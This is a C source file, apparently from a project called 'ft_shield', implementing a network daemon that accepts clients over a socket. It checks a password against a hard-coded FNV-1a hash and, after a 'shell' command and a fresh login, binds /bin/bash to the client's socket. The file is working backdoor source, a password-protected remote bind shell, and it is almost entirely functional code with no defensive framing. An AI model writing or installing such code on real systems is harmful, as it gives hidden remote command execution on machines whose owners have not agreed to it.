#include "ft_shield.h"
#include "errno.h"

int nb_clients = 0;

// Return 64-bit FNV-1a hash for a given password. See:
// https://en.wikipedia.org/wiki/Fowler–Noll–Vo_hash_function
static uint64_t fnv1a(const char* key) {
    uint64_t hash = FNV_OFFSET;
    for (const char* p = key; *p; p++) {
        hash ^= (uint64_t)(unsigned char)(*p);
        hash *= FNV_PRIME;
    }
    return hash;
}

char *clean_join(char *s1, char *s2) {
	char *tmp = ft_strjoin(s1, s2);
	free(s1);
	return tmp;
}

void putstr(int fd, char *s) {
	send(fd, s, ft_strlen(s), MSG_NOSIGNAL);
}

char *readline(int fd) {
	char *cmd = ft_strdup("");
	char buff[BUFFER_SIZE] = {};

	while (1) {
		int ret = recv(fd, buff, BUFFER_SIZE-1, MSG_DONTWAIT);
		if (ret == 0) {
			free(cmd);
			return NULL;
		} else if (ret > 0) {
			buff[ret] = 0;
			cmd = clean_join(cmd, buff);
		} else {
			if (errno == EAGAIN || errno == EWOULDBLOCK) {
				return cmd;
			}
			free(cmd);
			return NULL;
		}
	}

	return cmd;
}

void sh(Client *client, int pipefd) {
	if (!fork()) {
		int pid_child = fork();
		if (!pid_child) {
			dup2(client->fd, 0);
			dup2(client->fd, 1);
			dup2(client->fd, 2);

			execve("/bin/bash", (char*[]){"/bin/sh", NULL}, NULL);
		} else {
			waitpid(pid_child, NULL, 0);
			write(pipefd, &client->fd, sizeof(int));
		}
		exit(0);
	}
}

void check_password(Client *client, char *line) {
	if (fnv1a(line) == HASHED_PASSWORD) {
		client->logged = true;
	} else {
		putstr(client->fd, "Password: ");
	}
}

int main() {
	struct sockaddr_in addr = {};
	struct epoll_event ev, events[MAX_CLIENTS];
	Client clients[MAX_CLIENTS] = {};
	
	int pipefd[2];
	if (pipe(pipefd)) {
		DEBUG("pipe does not work");
		return 0;
	}

	bool shell = false;

	init_clients(clients);
	int sock = init_socket(&addr);
	if (!sock)
		return 0;

	int epollfd = epoll_create1(0);
	if (epollfd < 0) {
		DEBUG("epoll_create1 does not work");
		return 0;
	}

	ev.events = EPOLLIN;
	ev.data.fd = sock;
	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, &ev)) {
		DEBUG("epoll_ctl does not work");
		return 0;
	}

	ev.events = EPOLLIN;
	ev.data.fd = pipefd[0];
	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, pipefd[0], &ev)) {
		DEBUG("epoll_ctl does not work");
		return 0;
	}

	while (true) {
		int nfds = epoll_wait(epollfd, events, 256, -1);
		if (nfds == -1) {
			perror("wait: ");
			continue;
		}

		for (int n = 0; n < nfds; n++) {
			int fd = events[n].data.fd;
			if (fd == sock) {
				if (nb_clients >= MAX_CLIENTS) {
					refuse_client(sock, epollfd, &addr, &ev);
					continue;
				}
				int newfd = new_connection(sock, epollfd, &addr, &ev);
				add_client(clients, newfd);
				nb_clients++;
				putstr(newfd, "Password: ");
			} else if (fd == pipefd[0]) {
				int disconnected_fd;
				int r = read(pipefd[0], &disconnected_fd, sizeof(int));
				if (r != sizeof(int))
					continue;
				Client *client = get_client(clients, disconnected_fd);
				if (client)
					disconnect_client(client, epollfd, &ev);
			} else {
				Client *client = get_client(clients, events[n].data.fd);
				if (!client) {
					continue;
				}

				char *line = readline(client->fd);
				if (!line) {
					disconnect_client(client, epollfd, &ev);
					continue;
				}

				if (!client->logged) {
					check_password(client, line);
					if (client->logged && shell) {
						shell = false;
						sh(client, pipefd[1]);
						free(line);
						continue;
					}
				} else if (!ft_strcmp(line, "shell\n")) {
					shell = true;
					disconnect_client(client, epollfd, &ev);
				} else if (!ft_strcmp(line, "?\n")) {
					putstr(client->fd, HELP);
				}

				free(line);
			}
		}
	}

	close(pipefd[0]);
	close(pipefd[1]);
	close(sock);
}
